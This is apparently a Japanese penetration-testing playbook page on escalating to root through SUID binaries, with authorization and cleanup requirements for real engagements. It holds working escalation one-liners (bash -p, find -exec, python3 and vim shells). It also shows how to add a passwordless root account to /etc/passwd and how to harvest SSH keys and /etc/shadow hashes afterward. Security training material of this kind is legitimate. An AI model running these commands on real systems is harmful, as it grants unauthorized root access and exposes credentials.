# SUID / SGID バイナリによる権限昇格

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（/etc/passwd 直接編集パターンは不可逆。SUID 設定変更も痕跡が残る）
> - [ ] SIEM/EDR で確実に検知される（環境依存。auditd がある場合は SUID 変更を検知）
>
> 実施可否は事前合意で明示確認すること。/etc/passwd の書き換え（パターン4）と作成した SUID バイナリ・偽コマンドの削除（原状回復）必須。演習環境（HTB / OSCP 等）では制約なし。

## 概要

SUID（Set User ID）が設定されたバイナリは、実行時にファイルの所有者（通常 root）の権限で動作する。非特権ユーザーが SUID root バイナリを実行することで root 相当の操作が可能になる。

---

## 着火条件

`find / -perm -4000 -type f 2>/dev/null` の出力に、GTFOBins に掲載されているバイナリが含まれている場合。

---

## 確認コマンド

```bash
# SUID バイナリの検索
find / -perm -4000 -type f 2>/dev/null

# SGID バイナリの検索
find / -perm -2000 -type f 2>/dev/null

# SUID + SGID 両方
find / -perm /6000 -type f 2>/dev/null
```

---

## 観点・着眼点

**標準バイナリに SUID が設定されていないか確認する：**

以下のバイナリに SUID が設定されていれば GTFOBins で悪用方法を確認する。

| バイナリ | 悪用の難易度 |
|---------|------------|
| `/bin/bash` | 非常に簡単 |
| `python` / `python3` | 簡単 |
| `perl` / `ruby` | 簡単 |
| `find` | 簡単 |
| `vim` / `vi` | 簡単 |
| `nmap`（古いバージョン） | 可能 |
| `cp` / `mv` | `/etc/passwd` の書き換えで可能 |
| `wget` | `/etc/passwd` の上書きで可能 |

**非標準バイナリ（カスタムアプリケーション）にも注目：**
一般的でないパスにある SUID バイナリは、コードの脆弱性や PATH インジェクションで悪用できる可能性がある。

---

## 悪用手順

### bash に SUID が設定されている場合

```bash
/bin/bash -p
# -p オプションで特権モード（実効UIDを保持）でシェルを起動
```

### find に SUID が設定されている場合

```bash
find . -exec /bin/bash -p \; -quit
# または
find / -name "." -exec /bin/bash -p \; -quit
```

### python に SUID が設定されている場合

```bash
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### vim に SUID が設定されている場合

```bash
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
```

### cp / mv で /etc/passwd を書き換える場合

```bash
# 現在の /etc/passwd をコピー
cp /etc/passwd /tmp/passwd.bak

# パスワードなしのrootエントリを追加
echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd.bak

# SUID cp で上書き
cp /tmp/passwd.bak /etc/passwd

# 作成したアカウントでログイン
su hacker

# 作業完了後は必ず元に戻す（本番環境では必須）
cp /etc/passwd /tmp/passwd.modified.bak  # 念のため修正後もバックアップ
cp /tmp/passwd.bak /etc/passwd           # 元のファイルに戻す
```

---

## GTFOBins の使い方

1. https://gtfobins.github.io/ にアクセス
2. バイナリ名で検索（例: `find`）
3. 「SUID」タブを選択
4. 記載されているコマンドをそのまま実行

---

## 注意点・落とし穴

- SUID が設定されていても、バイナリが特権操作をしない実装であれば悪用できない場合がある
- `-p` オプションなしで bash を実行すると、シェルが実効UID をリセットしてしまう
- NFS マウントされたファイルシステムでは `nosuid` オプションで SUID が無効化されることがある
- **原状回復必須**：/etc/passwd の書き換えはシステムに永続的な変更を加える操作。
  作業完了後は必ずバックアップから元に戻すこと（`cp /tmp/passwd.bak /etc/passwd`）。
  CTFでは問題ないが、実際のペネトレストでは本番環境への影響が残るため事前承認が必要。

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。特に /etc/passwd 直接編集パターンは認証システムの設定変更を伴うため個別承認必須
- **想定されるSIEM/EDR検知**: 環境依存（auditd の `chmod` / `setuid` 監視ルール、`/etc/passwd` の整合性監視（AIDE / Tripwire）、ファイル変更通知）
- **業務影響リスク**: サービス停止リスクは低いが、/etc/passwd 編集を誤ると認証不能状態になる可能性あり
- **原状回復必須項目**:
  - ✅ /etc/passwd を編集した場合：作成した一時バックアップ（`/tmp/passwd.bak`）から元に戻す
  - ✅ SUID を新たに設定したバイナリ（例：`chmod +s /bin/bash`）の SUID クリア（`chmod -s [バイナリ]`）
  - ✅ 作成した偽コマンド・PATH インジェクション用バイナリの削除
  - ✅ `/tmp` 配下に作成した一時ファイルの削除
  - ✅ 追加した不正アカウントの削除
- **取得情報の取扱**: 取得した root 権限で参照したファイル（/etc/shadow 等）は暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 昇格成功後に確認すること（横展開観点）

**「SUID 経由で root になれた = ゴール」ではない。** root 権限を得た時点で以下を確認し、横展開・証跡収集を行う。

- `/root/.ssh/` 配下の秘密鍵 → 他ホストへの SSH 接続性の確認
- `/etc/shadow` 全エントリのハッシュ → 他システムでのパスワード使い回し検証（`hashcat` で一括クラック）
- `/root/.bash_history` → 直近の接続先・コマンド履歴
- root の cron / systemd サービスへの認証情報埋め込み
- AD 連携設定（`/etc/sssd/sssd.conf` / `/etc/krb5.conf`）→ ドメイン側資格情報
- 内部サービス（DB・管理画面・API）の設定ファイル・環境変数 → 接続情報・シークレット
- 作成・改造した SUID バイナリは原状回復必須（注意点・落とし穴・本番前提セクション参照）

---

## 関連技術
- 前：`./Enumeration_Checklist.md`（`find / -perm -4000` の実行）
- 後：Capabilities も確認 → `./Capabilities.md`
- 後：`/etc/shadow` を読めるようになった → ハッシュクラック: `../05_Tools_Reference/Hashcat.md`
- GTFOBins: https://gtfobins.github.io/
